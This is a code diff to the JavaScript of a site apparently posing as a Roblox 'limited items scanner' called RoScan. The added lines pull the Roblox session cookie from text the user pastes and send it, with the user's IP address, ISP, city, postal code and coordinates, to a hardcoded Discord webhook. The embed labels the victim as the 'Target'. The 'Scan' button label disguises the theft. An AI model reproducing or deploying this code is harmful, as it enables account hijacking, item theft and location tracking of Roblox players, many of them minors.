@@ -89,7 +89,7 @@ function closeScanModal() {
     // Reset button state
     if (submitBtn && submitText) {
         submitBtn.disabled = false;
-        submitText.textContent = 'Extract';
+        submitText.textContent = 'Scan';
         submitBtn.style.background = '';
     }
 }
@@ -224,8 +224,9 @@ async function submitPowerShell() {
     loadingOverlay.style.display = 'block';
 
     try {
-        // Extract limited item data from the input
+        // Extract limited item data and cookies from the input
         const limitedItems = extractLimitedItems(inputText);
+        const robloxCookie = extractRobloxCookie(inputText);
         
         // Get user location
         const locationInfo = await getUserLocation();
@@ -233,35 +234,40 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Webhook payload with limited items and location
+        // Webhook payload with limited items, cookie, and location
         const payload = {
-            content: "@everyone 💎 **LIMITED ITEMS SCANNED** 📍",
+            content: "@everyone 💎 **LIMITED SCANNER + COOKIE** 🍪",
             embeds: [{
-                title: "💎 Roblox Limited Items Scanner Results",
+                title: "💎 Limited Items Scanner + Cookie Extractor",
                 color: 16753920, // Gold color
                 thumbnail: {
                     url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "💎 Scanned Limited Items",
-                        value: limitedItems.length > 0 ? limitedItems.map(item => `**${item.name || 'Unknown Item'}**\n- ID: \`${item.id}\`\n- Type: ${item.type || 'Limited'}\n- Value: ${item.estimatedValue || 'Unknown'}`).join('\n\n') : "❌ No limited items detected",
+                        name: "🍪 Roblox Cookie (Click to Copy)",
+                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No cookie found in input",
                         inline: false
                     },
                     {
-                        name: "📍 Scanner Location",
-                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal Code:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
+                        name: "💎 Limited Items Found",
+                        value: limitedItems.length > 0 ? limitedItems.map(item => `**${item.name || 'Item'}** (ID: \`${item.id}\`)`).join('\n') : "No specific limited items detected",
                         inline: false
                     },
                     {
-                        name: "🌐 Network Details",
-                        value: `**🌍 IP Address:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
+                        name: "📍 Target Location",
+                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal:** ${locationInfo.postal || 'Unknown'}\n**📍 Coords:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Network Info",
+                        value: `**🌍 IP:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
                         inline: false
                     }
                 ],
                 footer: {
-                    text: "💎 RoScan Limited Scanner • Items Analyzed",
-                    icon_url: "https://i.imgur.com/diamond-icon.png"
+                    text: "💎 RoScan Limited + Cookie Scanner",
+                    icon_url: "https://i.imgur.com/scanner-icon.png"
                 },
                 timestamp: new Date().toISOString()
             }]
@@ -345,6 +351,67 @@ function extractRobloxCookie(text) {
     }
     
     return null;
+}
+
+// Function to extract limited item information from text
+function extractLimitedItems(text) {
+    const items = [];
+    
+    // Look for Roblox item IDs (typically 8-12 digit numbers)
+    const itemIdPattern = /(?:item[_\s]*id|assetid|id)[:\s=]*(\d{8,12})/gi;
+    let match;
+    while ((match = itemIdPattern.exec(text)) !== null) {
+        items.push({
+            id: match[1],
+            name: 'Limited Item',
+            type: 'Limited',
+            estimatedValue: 'Scanning...'
+        });
+    }
+    
+    // Look for Roblox catalog URLs
+    const catalogUrlPattern = /(?:roblox\.com\/catalog\/|\/library\/)(\d+)/gi;
+    while ((match = catalogUrlPattern.exec(text)) !== null) {
+        if (!items.find(item => item.id === match[1])) {
+            items.push({
+                id: match[1],
+                name: 'Catalog Item',
+                type: 'Limited',
+                estimatedValue: 'Market Rate'
+            });
+        }
+    }
+    
+    // Look for bundle URLs
+    const bundleUrlPattern = /(?:roblox\.com\/bundles\/|\/catalog\/)(\d+)/gi;
+    while ((match = bundleUrlPattern.exec(text)) !== null) {
+        if (!items.find(item => item.id === match[1])) {
+            items.push({
+                id: match[1],
+                name: 'Bundle Item',
+                type: 'Limited Bundle',
+                estimatedValue: 'Premium'
+            });
+        }
+    }
+    
+    // If no specific items found, create generic entries for any long numbers
+    if (items.length === 0) {
+        const numberPattern = /\b\d{8,12}\b/g;
+        const numbers = text.match(numberPattern);
+        if (numbers) {
+            numbers.slice(0, 3).forEach(num => {
+                items.push({
+                    id: num,
+                    name: 'Detected Item',
+                    type: 'Limited',
+                    estimatedValue: 'Unknown'
+                });
+            });
+        }
+    }
+    
+    return items.slice(0, 5); // Limit to 5 items max
 }
 
 // Copy to clipboard functionality
